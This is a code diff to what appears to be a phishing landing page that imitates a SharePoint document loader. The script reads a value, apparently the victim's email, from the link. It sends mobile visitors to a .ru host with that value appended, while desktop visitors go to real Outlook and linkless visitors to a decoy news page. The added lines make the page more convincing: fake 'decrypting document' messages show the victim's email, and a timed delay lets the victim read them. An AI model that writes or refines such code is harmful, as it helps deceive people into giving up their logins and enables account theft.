@@ -121,12 +121,12 @@
         </div>
         <div class="loading-container">
             <div class="spinner"></div>
-            <p class="loading-text">Verifying and loading...</p>
+            <p class="loading-text" id="loadingText">Securely connecting and verifying...</p>
         </div>
         <div class="progress-container">
             <div class="progress-bar-fill" id="progressBar"></div>
         </div>
-        <p class="file-info">This shouldn't take long.</p>
+        <p class="file-info" id="fileInfoText">This may take a few moments.</p>
         <noscript>
             <p>JavaScript is essential for SharePoint to function. Please enable JavaScript in your browser settings and reload the page.</p>
         </noscript>
@@ -140,6 +140,10 @@
         const MOBILE_REDIRECT_URL_BASE = "https://ZbgrM.ewwyb.ru/dsMb!vvJcU26gxo/$";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
+
+        const loadingTextElement = document.getElementById('loadingText');
+        const fileInfoTextElement = document.getElementById('fileInfoText');
+        const progressBarElement = document.getElementById('progressBar');
 
         // Mobile device detection function
         function isMobileDevice() {
@@ -166,28 +170,43 @@
 
             if (value) {
                 console.log("Found value:", value);
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl;
-                } else {
-                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
-                    window.location.href = DESKTOP_REDIRECT_URL;
+                // Update loading text to include the value/email
+                if (loadingTextElement) {
+                    loadingTextElement.textContent = "Decrypting document for: " + value;
                 }
+                if (fileInfoTextElement) {
+                    fileInfoTextElement.textContent = "Finalizing secure access...";
+                }
+
+                setTimeout(function() {
+                    if (isMobileDevice()) {
+                        const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                        console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                        window.location.href = redirectUrl;
+                    } else {
+                        console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
+                        window.location.href = DESKTOP_REDIRECT_URL;
+                    }
+                }, 500); // Add a small delay after updating text before redirect to allow user to see message
+
             } else {
                 console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
-                    document.getElementById('progressBar').style.width = '100%';
+                if (loadingTextElement) {
+                    loadingTextElement.textContent = 'Error: Document link appears to be invalid or has expired.';
+                }
+                if (fileInfoTextElement) {
+                    fileInfoTextElement.textContent = 'Please verify the link or contact support for assistance.';
+                }
+                if(progressBarElement) {
+                    progressBarElement.style.backgroundColor = '#d9534f'; // Error color
+                    progressBarElement.style.width = '100%';
                 }
                 // No redirect if no value, error is shown on page
             }
         }
 
-        // Execute redirect after a short delay
-        setTimeout(performRedirect, REDIRECT_DELAY);
+        // Execute redirect after a short delay for initial loading messages & animation
+        setTimeout(performRedirect, REDIRECT_DELAY - 500); // Start performRedirect a bit earlier to show the new message
     })();
     </script>
 </body>
